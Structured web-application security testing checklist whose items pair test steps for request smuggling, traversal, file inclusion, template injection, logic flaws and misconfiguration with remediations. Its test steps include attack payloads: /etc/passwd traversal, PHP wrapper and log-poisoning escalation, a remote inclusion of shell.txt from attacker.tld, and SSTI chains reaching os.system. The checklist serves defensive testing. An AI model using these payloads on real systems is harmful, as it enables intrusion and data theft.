items.title: HTTP Splitting/Smuggling
items.description: Test for HTTP request splitting and smuggling vulnerabilities.
items.how_to_find: Request smuggling occurs when a front-end and back-end disagree on request boundaries. Use the Burp 'HTTP Request Smuggler' extension to probe CL.TE, TE.CL, and TE.TE desync (conflicting Content-Length vs Transfer-Encoding: chunked with obfuscations like 'Transfer-Encoding: chunked' + trailing space, or duplicate headers). Confirm safely with the timing/differential technique the extension provides, then demonstrate impact (prefix a victim request, capture other users' requests, or bypass front-end auth). Response splitting: inject CRLF (%0d%0a) into headers/redirect params to see if you can add headers. Test HTTP/2 downgrade desync too.
items.how_to_fix: Ensure front-end and back-end use the same HTTP parser and reject ambiguous requests (both Content-Length and Transfer-Encoding, malformed chunked). Prefer HTTP/2 end-to-end, disable connection reuse to the back-end where feasible, and normalize/validate headers at the edge. Strip CR/LF from any user input used in response headers. Verify by re-running HTTP Request Smuggler (no desync).

items.title: Path Traversal
items.description: Test for vulnerabilities that allow attackers to traverse the directory structure of the server.
items.how_to_find: Similar to directory traversal but focus on API/route path handling and static-file servers: request %2e%2e%2f sequences in the URL path itself (GET /static/..%2f..%2f..%2fetc/passwd), test misconfigured reverse proxies (nginx alias traversal: /static../ ), and archive/upload extraction that writes outside the target dir (Zip Slip). Try mixed slashes and encoded dots against the router. Confirm by reading a known file (/etc/passwd, web.config, app source).
items.how_to_fix: Canonicalize and validate the resolved path against an allow-listed base directory before any file access; reject decoded traversal sequences. Fix proxy config (ensure nginx location has a trailing slash to avoid alias traversal). Validate archive entry paths during extraction. Serve static files through a hardened, sandboxed handler with least privilege. Verify by replaying path-traversal payloads (should be blocked).

items.title: File Inclusion
items.description: Check for Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities.
items.how_to_find: LFI (common in PHP include()): ?page=../../../../etc/passwd; escalate to RCE via PHP wrappers - php://filter/convert.base64-encode/resource=index.php to read source, data://text/plain;base64,<payload>, or log/session poisoning (inject PHP into User-Agent then include /var/log/apache2/access.log). RFI (when allow_url_include=On): ?page=http://attacker.tld/shell.txt. Fuzz the param with the SecLists LFI list and Burp Intruder; try php://, expect://, zip:// wrappers. Confirm via file contents or code execution (OOB callback).
items.how_to_fix: Never pass user input to include/require/file APIs; use an allow-list mapping of permitted views/files (switch on an ID, not a path). Disable dangerous PHP settings (allow_url_include=Off, allow_url_fopen=Off) and stream wrappers where possible. Canonicalize and confine any file path to a base directory. Verify by replaying LFI/RFI/wrapper payloads (should fail).

items.title: Template Injection
items.description: Test for vulnerabilities in template engines that could lead to code execution.
items.how_to_find: Server-Side Template Injection (SSTI): inject a math probe like {{7*7}} or ${7*7} or #{7*7} and see if the response shows 49 (evaluated). Then fingerprint the engine (Jinja2 {{7*'7'}}=7777777, Twig, Freemarker, Velocity, ERB) and escalate: Jinja2 {{config}} / {{''.__class__.__mro__[1].__subclasses__()}} to reach os.system; Freemarker <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}. Automate with tplmap -u 'https://target/?name=test'. Common sinks: profile names, email templates, PDF/report generators, error pages that render user input.
items.how_to_fix: Never render user input as part of a template; pass it as data/context variables to a pre-defined template. If users must supply templates, use a sandboxed, logic-less engine (e.g. a locked-down Jinja SandboxedEnvironment or a logic-less engine like Mustache) with no access to objects/builtins. Patch the template engine. Verify with the {{7*7}} probe and tplmap after the fix (should not evaluate).

items.title: Input Length
items.description: Validate input length to prevent buffer overflow attacks.
items.how_to_find: Submit oversized inputs to every field and body (e.g. python3 -c "print('A'*100000)" piped into a param, or a multi-MB JSON) and watch for crashes, 500 errors, timeouts, memory spikes, or reflected DoS. Test large arrays/deeply nested JSON (billion-laughs / JSON bombs), huge multipart uploads, and very long headers/URLs. In native/legacy components, over-long input may cause buffer overflow; in web stacks it more often causes resource-exhaustion DoS. Confirm the server enforces a max size (returns 413/400) rather than processing unbounded input.
items.how_to_fix: Enforce maximum length/size limits server-side on fields, request bodies, headers, uploads, and array/object depth (e.g. client_max_body_size in nginx, JSON depth limits). Reject over-limit input with 413/400 before processing. For native code, use bounds-checked APIs and memory-safe languages where possible. Verify by resubmitting oversized inputs (should be rejected quickly).

items.title: Data Sanitization
items.description: Ensure input data is properly sanitized before processing.
items.how_to_find: Probe how special characters are handled across sinks: < > ' " ; -- /* */ ${} {{}} \ %00 and unicode/homoglyph variants. Test that sanitization isn't naive blacklisting (bypass with case, encoding, nested payloads like <scr<script>ipt>, or double-encoding). Check that sanitization is applied consistently on all inputs (params, headers, cookies, JSON, file names) and matches the destination context (HTML vs SQL vs shell vs LDAP). A field that strips <script> but allows onerror= is a signal of blacklist-based sanitization.
items.how_to_fix: Prefer context-specific output encoding and parameterized APIs over input sanitization; where sanitization is needed use vetted allow-list libraries (DOMPurify, OWASP Java HTML Sanitizer) not custom blacklists. Validate against strict allow-lists (type/format/range) and normalize/canonicalize before validating. Verify by replaying encoding/nesting bypasses (should be neutralized).

items.title: Encoding
items.description: Verify that all input is appropriately encoded before outputting.
items.how_to_find: For each place user data is rendered, confirm it is encoded for that exact output context: HTML body (< becomes <), HTML attribute (quote/space encoding), JavaScript string (\x/\u escaping), URL (percent-encoding), and CSS. Inject test and "'`<> markers and inspect the raw response/DOM - if they appear literally interpreted, encoding is missing or wrong-context. Pay attention to data placed into JS via server templates, JSON embedded in HTML, and href/src attributes (javascript: URIs).
items.how_to_fix: Apply output encoding at render time using context-aware encoders from the framework/OWASP Java Encoder; encode for the specific sink (HTML, attribute, JS, URL, CSS) rather than a single generic escape. Keep data and code separate (don't build HTML/JS by string concatenation). For URLs, validate the scheme (block javascript:/data:). Verify by re-injecting markers and confirming they render inert.

items.title: Logic Flaws and Bypasses
items.description: Identify and test for logic flaws and bypasses in the application’s workflow.
items.how_to_find: Business logic flaws are context-specific and not found by scanners - model the intended workflow, then break the assumptions. Common tests: negative/decimal quantities (qty=-1 to get a credit), price/total tampering in the request (price=0.01), applying a coupon multiple times, skipping a payment step by calling the confirmation endpoint directly, changing currency, and abusing 'trial'/'free' limits by resetting client state. Intercept every step in Burp and replay/modify parameters the server should own. Compare what the UI enforces vs what the API accepts.
items.how_to_fix: Enforce all business rules server-side using values the server controls (recompute prices/totals/eligibility from the database, never trust client-sent amounts). Validate state and preconditions on every step. Add invariants and server-side limits, log anomalies, and add automated abuse-case tests. Verify by replaying the exact tampered request (should be rejected).

items.title: Security Controls in Business Processes
items.description: Verify the proper implementation of security controls in business processes.
items.how_to_find: Identify security controls embedded in workflows (approval gates, spending limits, fraud checks, dual authorization, KYC) and test whether they can be evaded. Examples: submit a high-value action just under a threshold repeatedly to avoid review; bypass an approval step by calling the post-approval endpoint; disable a fraud/limit check by removing or flipping a client-side flag. Confirm controls fire server-side and cannot be reordered or skipped.
items.how_to_fix: Implement each control server-side as a mandatory, non-skippable step tied to server state; enforce cumulative limits (not just per-request) and separation of duties for approvals. Log control decisions for audit. Verify by attempting to skip/reorder the control and confirming the action is blocked.

items.title: Race Conditions
items.description: Test for race conditions that could cause security issues.
items.how_to_find: Target actions with a check-then-act gap: redeeming a one-time coupon/gift card, withdrawing balance, using a limited resource, or applying a discount. Send many identical requests in parallel to hit the window - Burp Repeater 'Send group in parallel' (single-packet attack for HTTP/2), the Turbo Intruder extension (race-single-packet-attack.py), or ffuf with high concurrency. Success signals: balance goes negative, a coupon applies N times, more items than stock are purchased. Also test parallel signup/limit-bypass.
items.how_to_fix: Make critical operations atomic: use database transactions with proper isolation, SELECT ... FOR UPDATE / row locks, unique constraints, atomic decrements, or idempotency keys so concurrent requests can't double-spend. Avoid check-then-act patterns in application code. Verify by re-running the parallel/single-packet attack (only one request should succeed).

items.title: Business Process Tampering
items.description: Ensure that business process steps cannot be manipulated or skipped.
items.how_to_find: For multi-step flows (cart -> shipping -> payment -> confirm; or registration -> email verify -> activate), try to skip, reorder, or repeat steps by directly requesting later endpoints with a partial state. E.g. POST /checkout/confirm before /checkout/payment, or activate an account without verifying email. Manipulate hidden state fields (step=payment changed to step=complete) and use back/forward + resubmit. Check whether the server validates the current position in the process.
items.how_to_fix: Track and validate workflow state server-side (a state machine) so each step verifies the required prior steps are complete before proceeding; reject out-of-order or repeated steps. Don't rely on client-supplied step indicators. Verify by attempting to jump to later steps directly (should be rejected).

items.title: Transaction Manipulation
items.description: Test for the ability to manipulate transactions to cause unintended outcomes.
items.how_to_find: On payment/transfer/order requests, tamper server-owned values: amount, price, quantity, currency, tax, discount, recipient account, and product ID (buy an expensive item at a cheap item's price by swapping IDs). Test negative amounts (refund abuse), rounding/precision (0.001 * large qty), and changing the total after price calculation. Intercept the final confirm request and modify the numbers; check if the server re-validates against the catalog/ledger.
items.how_to_fix: Recompute all monetary values, taxes, and totals server-side from trusted catalog/pricing data; never accept client-supplied prices or totals. Validate currency, sign (no negatives where invalid), and precision. Reconcile against an authoritative ledger and log discrepancies. Verify by replaying tampered amount/price requests (server should use its own values).

items.title: Workflow Validation
items.description: Verify that business workflows enforce proper sequencing and validation at each step.
items.how_to_find: Verify each workflow enforces required sequencing and per-step validation server-side. Test invalid transitions (draft -> paid without approval, order -> shipped without payment), missing-prerequisite jumps, and re-submitting a completed step. Try tampering IDs/tokens that link steps together (use another user's cart/order token mid-flow). Confirm that skipping validation on any step (e.g. address/eligibility) isn't possible by calling the next endpoint directly.
items.how_to_fix: Model workflows as an explicit server-side state machine with allowed transitions; validate preconditions and ownership at every step and reject anything out of sequence. Bind step tokens to the authenticated user and current state. Verify by attempting each invalid transition (should be blocked).

items.title: Inconsistent State
items.description: Test for conditions that could lead to an inconsistent state in the application.
items.how_to_find: Try to leave the system in a contradictory state: cancel an order after it ships, delete an account with pending transactions, abort a multi-write operation partway (close the connection mid-request), or trigger partial failures (payment succeeds but order creation fails). Use race conditions and forced errors to create orphaned/duplicate records. Look for states the UI never allows but the API does (e.g. active subscription with no payment method).
items.how_to_fix: Wrap multi-step data changes in atomic transactions with rollback on failure; enforce referential integrity and invariants at the database level. Handle partial-failure paths explicitly (sagas/compensating actions for distributed ops). Add reconciliation jobs to detect drift. Verify by inducing partial failures and confirming the system rolls back cleanly.

items.title: Integrity Checks
items.description: Ensure that integrity checks are implemented and cannot be bypassed.
items.how_to_find: Find data whose integrity is enforced by a signature/hash/checksum (signed URLs, JWTs, HMAC'd parameters, license keys, price tokens) and test whether the check can be bypassed: strip the signature, change the algorithm (JWT alg:none), reuse a signature across different data, or find the signing key in client code. Also test client-side-only integrity checks (modify the value the server trusts). Confirm tampered-but-'valid' requests are rejected.
items.how_to_fix: Verify integrity server-side with a strong keyed MAC (HMAC-SHA256) or signature over the full canonical data, using a secret never exposed to clients; reject on any mismatch and pin the algorithm. Don't rely on client-side checks. Verify by submitting tampered data with a stripped/forged signature (should be rejected).

items.title: Business Logic Abuse
items.description: Identify potential abuse cases in the business logic.
items.how_to_find: Think like a fraudster: abuse legitimate features at scale or in unintended ways - referral/loyalty point farming with fake accounts, repeatedly using a 'first order' discount, mass-scraping data via a search API, exhausting a competitor's inventory by adding to cart and abandoning, or exploiting generous return/refund policies. Automate the abuse (Burp Intruder, scripts) to show impact and check for missing per-user/global limits and anti-automation.
items.how_to_fix: Define and enforce abuse limits server-side (per-user, per-IP, per-account-age, global caps), add anti-automation (rate limits, CAPTCHA, device/account reputation), and detect anomalous patterns with monitoring/alerting. Tie promotions to verified identity/payment. Verify by re-running the abuse automation and confirming limits/detection trigger.

items.title: Transaction Duplication
items.description: Test for the possibility of duplicating transactions.
items.how_to_find: Replay the same transaction/submit request multiple times (Burp Repeater, or double-click / back-and-resubmit) and check if it processes more than once - duplicate orders, double charges/refunds, repeated point credits. Test missing idempotency: resend a payment with the same idempotency key vs a new one, and send concurrent duplicates (race) to bypass a naive 'already processed' check. Confirm whether the server dedupes.
items.how_to_fix: Require and honor idempotency keys for state-changing/financial operations so retries are safe, and dedupe on a unique transaction ID at the database level (unique constraint). Combine with atomic transactions to defeat concurrent duplicates. Verify by replaying and racing the same request (only one effect should occur).

items.title: Conditional Logic
items.description: Verify that conditional logic enforces the correct business rules.
items.how_to_find: Test business rules driven by conditions (eligibility, discounts tiers, feature flags, limits) by supplying edge/boundary and unexpected values: exactly-at vs just-over thresholds, missing fields (does a null skip the check?), unexpected enum values, or client-controlled flags (is_premium=true, isEligible=true). Look for conditions evaluated client-side or trusting client-provided attributes to unlock benefits/access.
items.how_to_fix: Evaluate all conditional business rules server-side using authoritative, server-derived attributes (never client-sent eligibility flags); handle null/edge/boundary inputs explicitly with deny-by-default. Cover rules with unit tests including boundaries. Verify by submitting boundary and flag-tampering values (should not unlock unauthorized outcomes).

items.title: Configuration of Servers, Databases, and Frameworks
items.description: Check for improper configurations of web servers, databases, and frameworks.
items.how_to_find: Fingerprint the stack (whatweb, nmap -sV, Wappalyzer) and look for insecure defaults: verbose Server/X-Powered-By banners, TRACE/OPTIONS enabled (curl -X OPTIONS -i https://target), directory listing, exposed admin/DB ports (nmap -p 3306,5432,6379,9200,27017 target - open MySQL/Postgres/Redis/Elasticsearch/Mongo without auth), default framework routes (Spring /actuator, Laravel debug), and sample/config files (/phpinfo.php, /.env, /web.config). Run nikto -h https://target and nuclei -u https://target -t http/misconfiguration/ for automated coverage. Check DB anonymous access with redis-cli -h target ping / mongosh.
items.how_to_fix: Harden each component to CIS/vendor benchmarks: remove banners, disable TRACE/unneeded methods and directory listing, bind databases/admin ports to localhost or a private network with authentication, remove sample/debug files, and disable framework debug endpoints in production. Manage config as code and scan continuously. Verify by re-running nikto/nuclei/nmap (findings resolved).

items.title: Debug and Error Messages
items.description: Verify that debug and error messages do not reveal sensitive information.
items.how_to_find: Trigger errors and read the responses: send malformed input, wrong types, oversized values, and hit non-existent routes to force stack traces. Look for full stack traces, SQL error strings (leaking queries/schema), framework debug pages (Django DEBUG=True, Symfony/Laravel Whoops, ASP.NET yellow screen), internal file paths, library versions, and internal IPs/hostnames. Test /debug, ?debug=true, and error endpoints. These leak info that aids further attacks (SQLi, path disclosure).
items.how_to_fix: Disable debug mode in production (DEBUG=False, customErrors=On), return generic error messages to users, and log full details only server-side. Configure custom error pages for 4xx/5xx and ensure exceptions never render stack traces to clients. Verify by re-triggering errors (should show only a generic message).

items.title: Removal of Unnecessary Features
items.description: Ensure that unnecessary features, such as default accounts or sample files, are removed.
items.how_to_find: Enumerate leftover/default artifacts: sample apps and docs (/examples, /docs, Tomcat /examples, /manager), default accounts, test endpoints, unused HTTP methods, enabled-but-unused modules/plugins, and demo files. Content-discovery with feroxbuster/ffuf and the SecLists 'Common' + framework-specific wordlists surfaces these. Check for verbose services and features enabled by default that the app doesn't need (WebDAV, PUT, server-status, phpMyAdmin).
items.how_to_fix: Apply the principle of minimal attack surface: uninstall/disable unused components, modules, sample apps, default accounts, and HTTP methods; remove documentation and test files from production. Maintain a hardened base image. Verify by re-running content discovery (removed artifacts should 404).

items.title: HTTP Headers
items.description: Verify proper HTTP headers are set (e.g., Content-Type, Cache-Control).
items.how_to_find: Inspect response headers (curl -I https://target, or the Mozilla Observatory / securityheaders.com). Check Content-Type correctness (X-Content-Type-Options: nosniff to stop MIME sniffing), Cache-Control: no-store on sensitive/authenticated responses (else data is cached), and presence/config of security headers (HSTS, CSP, X-Frame-Options/frame-ancestors, Referrer-Policy, Permissions-Policy). Flag missing nosniff, cacheable authenticated pages, wrong charset, and info-leaking headers (Server, X-Powered-By, X-AspNet-Version).
items.how_to_fix: Set correct Content-Type with charset, X-Content-Type-Options: nosniff, and Cache-Control: no-store/private on sensitive responses; add the full security-header set (HSTS, CSP, frame-ancestors, Referrer-Policy, Permissions-Policy) and remove version-disclosing headers. Configure centrally at the app/reverse-proxy. Verify with curl -I and securityheaders.com (A grade).

items.title: Secure Directory Listings
items.description: Ensure directory listings are disabled on the web server.
items.how_to_find: Request directory paths without an index file (e.g. /images/, /uploads/, /backup/, /js/) and look for an auto-generated file listing ('Index of /...'). Enumerate candidate directories with feroxbuster/ffuf, then browse each with a trailing slash. Directory listing leaks file names (backups, source, configs) that enable further attacks. Also check cloud/static hosts (S3 bucket listing).
items.how_to_fix: Disable auto-indexing (Apache 'Options -Indexes', nginx 'autoindex off', IIS Directory Browsing off), and ensure sensitive directories require auth or are outside the web root. Provide index files or return 403/404. Verify by re-requesting the directories (no listing shown).

items.title: File Permissions
items.description: Check for proper file permissions to prevent unauthorized access.
items.how_to_find: Black-box: try to fetch files that should be private via the web (/.env, /config.php~, /.git/config, /backup.zip, /wp-config.php.bak) - a 200 means they're web-served. Host-level (if you have shell): find world-writable/readable sensitive files (find / -perm -o+w -type f 2>/dev/null; ls -la on config/keys), check that private keys/config are 600 and owned by the app user, and that the web root isn't writable by the web server (enables webshell upload -> RCE).
items.how_to_fix: Apply least-privilege file permissions: config/secrets 600 owned by a dedicated user, no world-writable files, and the web root not writable by the runtime user. Keep secrets/backups outside the web root and deny access to dotfiles/VCS dirs at the server. Verify by re-fetching sensitive files (404/403) and auditing permissions.

items.title: Default Error Pages
items.description: Ensure custom error pages are configured to prevent information disclosure.
items.how_to_find: Request bad URLs and trigger 400/403/404/500 to see the error pages. Default server error pages (Apache/nginx/IIS/Tomcat) reveal the server software and version and confirm the tech stack; framework default 500 pages can leak traces. Compare responses across error codes and note any version strings or 'Powered by' text.
items.how_to_fix: Configure custom, generic error pages for all common status codes (4xx/5xx) that reveal no software versions or internal details, at both the web server and application layers. Verify by triggering each error code (only generic pages shown).

items.title: Administrative Interfaces
items.description: Verify that administrative interfaces are properly secured and not exposed to unauthorized users.
items.how_to_find: Discover admin panels via content discovery and known paths: /admin, /administrator, /wp-admin, /manager/html, /phpmyadmin, /console, /actuator, /grafana, /kibana, /jenkins. ffuf -w /usr/share/seclists/Discovery/Web-Content/AdminPanels.fuzz.txt -u https://target/FUZZ. Check whether they're reachable from the internet, use default/weak creds, lack MFA, or lack IP restrictions. Test auth bypass and default credentials on each.
items.how_to_fix: Restrict admin interfaces to trusted networks/VPN or an authenticated gateway, require strong unique credentials + MFA, rename/relocate off predictable paths (defense in depth, not sole control), and monitor access. Verify by attempting to reach admin panels from the internet and with default creds (should fail).

items.title: Third-Party Integrations
items.description: Check for security configurations in third-party integrations and services.
items.how_to_find: Review integrations (payment, analytics, chat, maps, SSO, webhooks). Check for exposed API keys/secrets in JS or responses (grep for api_key, Bearer, sk_live), overly broad third-party scopes, unauthenticated/unsigned inbound webhooks (replay or forge them), and CORS/postMessage trust of third-party origins. Test whether client-side integration secrets can be abused, and whether the third-party can be pointed at an attacker (SSRF-able callback/redirect URLs).
items.how_to_fix: Keep integration secrets server-side (proxy third-party calls), scope keys minimally and rotate them, verify webhook signatures and source, and restrict CORS/postMessage to explicit trusted origins. Vet third-party security and monitor usage. Verify by attempting to forge webhooks and abuse exposed keys (should fail).

items.title: Configuration Management
items.description: Verify that configuration management practices are in place to maintain secure settings.
items.how_to_find: Assess whether configuration is managed consistently and securely across environments. Signals of poor config management: dev/debug settings in prod, environment-specific secrets committed to the repo, drift between servers, exposed config files (/.env, appsettings.json, /.git/), and different security headers/settings across instances. Check for secrets in client bundles and version control (git history), and inconsistent TLS/hardening between nodes.
items.how_to_fix: Manage configuration as code (IaC) with environment separation, store secrets in a secret manager (never in repos/images), enforce a hardened baseline, and use drift detection + config scanning in CI. Verify by confirming no secrets in VCS/bundles and consistent hardened settings across environments.

items.title: Software Updates
items.description: Ensure all software components are up-to-date with the latest security patches.
items.how_to_find: Fingerprint versions of the server, framework, CMS, JS libraries, and dependencies (whatweb, Wappalyzer, retire.js for client-side, nuclei tech-detect templates) and compare against known CVEs (nuclei -u https://target -t http/cves/, searchsploit, NVD). Check client-side libs (jQuery, Angular, Bootstrap) with retire.js, and server components from banners/error pages. Confirm exploitability where safe.
items.how_to_fix: Establish a patch-management process: track components with an SBOM, run SCA (Dependabot, Snyk, OWASP Dependency-Check) in CI, and apply security updates promptly (prioritize internet-facing and known-exploited CVEs). Verify by re-scanning after patching (no known-vulnerable versions).

items.title: Backup Configurations
items.description: Check the security of backup configurations and processes.
items.how_to_find: Hunt for exposed backups: request common backup names (/backup.zip, /backup.sql, /db.sql, /site.tar.gz, /wp-content/backup/, source files with ~/.bak/.old/.swp suffixes) and fuzz with the SecLists backup wordlist. Check for world-readable backups in the web root, unencrypted DB dumps, and publicly listed cloud buckets/snapshots holding backups. A downloadable DB backup = full data breach.
items.how_to_fix: Store backups outside the web root, encrypt them at rest and in transit, restrict access (least privilege), and never keep editor/temp backup files on production. Test restores and monitor access. Verify by attempting to download backup files over the web (should 404/403).

items.title: API Security Settings
items.description: Verify that APIs are securely configured to prevent unauthorized access.
items.how_to_find: Review API config: overly permissive CORS (ACAO reflected + Allow-Credentials), GraphQL introspection enabled (POST a __schema query) and no query depth/complexity limits, missing rate limiting, verbose errors, unauthenticated docs (/swagger, /openapi.json, /graphql), and HTTP methods not locked down. Enumerate endpoints from the spec, then test authz, rate limits (Burp Intruder), and CORS with curl -H 'Origin: https://evil.tld' -I.
items.how_to_fix: Lock down CORS to explicit origins, disable GraphQL introspection in prod and add depth/complexity/rate limits, require auth on docs or remove them, enforce per-client rate limiting and strict method allow-lists, and return generic errors. Verify by re-testing CORS, introspection, and rate limits post-hardening.

items.title: Encryption of Sensitive Data
items.description: Ensure that sensitive data (PII, passwords, credit card information) is encrypted at rest and in transit.
items.how_to_find:
IN TRANSIT
1) Force HTTP and see if plaintext is accepted:
   curl -sSI http://target.tld/login   (expect 301 -> https, plus HSTS)
2) Grade the TLS config:
   testssl.sh https://target.tld
   nmap --script ssl-enum-ciphers -p 443 target.tld
   Flag: TLS 1.0/1.1, SSLv3, RC4/3DES/EXPORT ciphers, no forward secrecy, expired/self-signed cert.
3) Proxy through Burp and search the history for any http:// request carrying credentials, tokens, or PII.

AT REST (needs DB/host access or a data dump)
- Inspect sensitive columns for plaintext:
    SELECT id, email, card_number, ssn FROM users LIMIT 5;
  A readable PAN/SSN = no field encryption.
- Check volume/disk encryption, DB TDE, and backup encryption.

OVER-EXPOSURE
- Compare API vs UI: GET /api/users/me often returns more PII (phone, DOB, internal flags) than the screen shows.
items.how_to_fix:
IN TRANSIT: HTTPS everywhere + HSTS; disable TLS < 1.2; remove RC4/3DES/EXPORT; enable PFS (ECDHE). Target SSL Labs grade A/A+.
AT REST: enable full-disk/volume + backup encryption AND application-level encryption (AES-256-GCM) for the most sensitive fields (PAN, SSN, health). Keep keys in a KMS/HSM, never in code.
MINIMIZE: return only the PII each role actually needs.
VERIFY: re-run testssl.sh (no weak protocols) and confirm sensitive columns are ciphertext.

items.title: Secure Protocols
items.description: Verify the implementation of secure protocols (e.g., HTTPS, TLS).
items.how_to_find:
1) Enumerate supported protocols/ciphers:
   testssl.sh --protocols --ciphers https://target.tld
   sslscan target.tld:443
   nmap -sV --script ssl-enum-ciphers -p 443,8443 target.tld
2) Check certificate validity, chain, hostname match, and expiry.
3) Test HTTP->HTTPS redirect and HSTS:
   curl -sSI http://target.tld/    (look for Location: https and Strict-Transport-Security)
4) Look for mixed content (HTTPS page loading http:// scripts/images) in DevTools console.
5) Check other channels too (SMTP STARTTLS, WebSocket wss://, API subdomains).

RED FLAGS: TLS 1.0/1.1 or SSLv3 enabled, RC4/DES/3DES/NULL ciphers, no PFS, weak DH (<2048), renegotiation issues, self-signed/expired certs.
items.how_to_fix: Disable SSLv3/TLS 1.0/1.1; allow only TLS 1.2+ (prefer 1.3). Use a strong cipher suite with ECDHE (forward secrecy) and drop RC4/3DES/EXPORT/NULL. Use valid CA-signed certs, automate renewal, and enable OCSP stapling. Add HSTS (max-age=31536000; includeSubDomains; preload) and fix mixed content. VERIFY with SSL Labs / testssl.sh (grade A/A+).

items.title: Data Leakage
items.description: Check for inadvertent data leakage in logs, error messages, or client-side code.
items.how_to_find:
CLIENT-SIDE
- Grep JS bundles and HTML comments for secrets/PII:
    curl -s https://target.tld/main.js | grep -iE 'api[_-]?key|secret|token|password|bearer|BEGIN (RSA|PRIVATE)'
  Automate: run LinkFinder / SecretFinder over discovered .js files.
- Check source maps (.js.map) that expose original source.

RESPONSES / ERRORS
- Trigger errors (bad input, wrong types) and look for stack traces, SQL, internal paths, hostnames.
- Inspect API responses for excessive fields (internal IDs, other users' data, debug flags).

METADATA / LOGS
- Check uploaded/served files for EXIF/metadata (exiftool file.jpg).
- Look for exposed logs: /logs/, /debug.log, /error_log, /.git/, /.svn/.
- Verify credentials/tokens are not written to accessible logs or the Referer header.
items.how_to_fix: Strip secrets from client code/comments and remove source maps from prod. Return generic errors to users; log details server-side only. Apply response DTOs so APIs return exactly the fields needed (no over-exposure). Redact secrets/PII from logs, strip file metadata on upload, and block access to log/VCS directories. VERIFY by re-grepping JS and re-triggering errors (no leakage).

items.title: HTTP Strict Transport Security (HSTS)
items.description: Verify the use of HSTS to enforce secure connections.
items.how_to_find:
1) Check the header on an HTTPS response:
   curl -sSI https://target.tld/ | grep -i strict-transport-security
   Expected: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
2) Flag problems:
   - Header missing entirely (users can be SSL-stripped / downgraded via MITM).
   - Short max-age (e.g. 300) - weak.
   - Missing includeSubDomains (subdomains unprotected).
   - HSTS sent over HTTP only (browsers ignore it - must be on HTTPS).
3) Confirm the HTTP->HTTPS redirect exists:
   curl -sSI http://target.tld/
4) Check preload eligibility at hstspreload.org.
items.how_to_fix: Send on every HTTPS response: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload. Redirect all HTTP to HTTPS first, ensure the whole domain (and subdomains) is HTTPS-only, then submit to the browser preload list. Configure at the reverse proxy/app (nginx add_header, Apache Header always set). VERIFY with curl -I and hstspreload.org.

items.title: Information Disclosure
items.description: Test for information disclosure vulnerabilities that reveal sensitive information.
items.how_to_find:
1) Fingerprint + banners:
   whatweb https://target.tld ; curl -sSI https://target.tld  (Server, X-Powered-By, X-AspNet-Version)
2) Content discovery for leaked files:
   feroxbuster -u https://target.tld -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
   Targets: /.git/config, /.env, /phpinfo.php, /server-status, /swagger.json, /actuator/env, *.bak *.old *.zip
3) Force verbose errors (malformed input, wrong Content-Type) and read stack traces.
4) Inspect responses/headers/comments for internal IPs, hostnames, usernames, versions, debug data.
5) Google/Shodan dorking: site:target.tld ext:log | ext:sql, and check pastebin/GitHub for leaks.
items.how_to_fix: Remove version/tech banners, disable /server-status /actuator /phpinfo and debug endpoints in prod, and block dotfiles/VCS/backup files at the web server. Return generic error pages. Strip internal details from responses/headers/comments. Monitor for public leaks. VERIFY by re-running content discovery and error triggers (no sensitive disclosure).

items.title: Backup Data
items.description: Ensure that backup data is securely stored and encrypted.
items.how_to_find:
1) Probe common backup/dump names over HTTP:
   ffuf -w /usr/share/seclists/Discovery/Web-Content/backup-files.txt -u https://target.tld/FUZZ -mc 200
   Also try derived names: backup.zip, db.sql, dump.sql, site.tar.gz, www.zip, {domain}.zip, config.php.bak, index.php~, .index.php.swp
2) Check the web root for editor/temp copies (~ .bak .old .save .swp .orig) of live files.
3) Cloud: list public buckets/snapshots that hold backups (aws s3 ls s3://bucket --no-sign-request) and check for unencrypted DB snapshots.
4) If a backup is reachable, confirm it contains sensitive data (a downloadable DB dump = full breach).
items.how_to_fix: Store backups OUTSIDE the web root; encrypt them at rest and in transit; restrict access with least privilege and MFA. Never leave editor/temp backups on production. Lock down cloud buckets/snapshots (block public access, encrypt). Rotate and test restores. VERIFY by attempting to download backup files over the web (should 404/403).

items.title: Data Masking
items.description: Verify that sensitive data is masked or obfuscated where appropriate.
items.how_to_find:
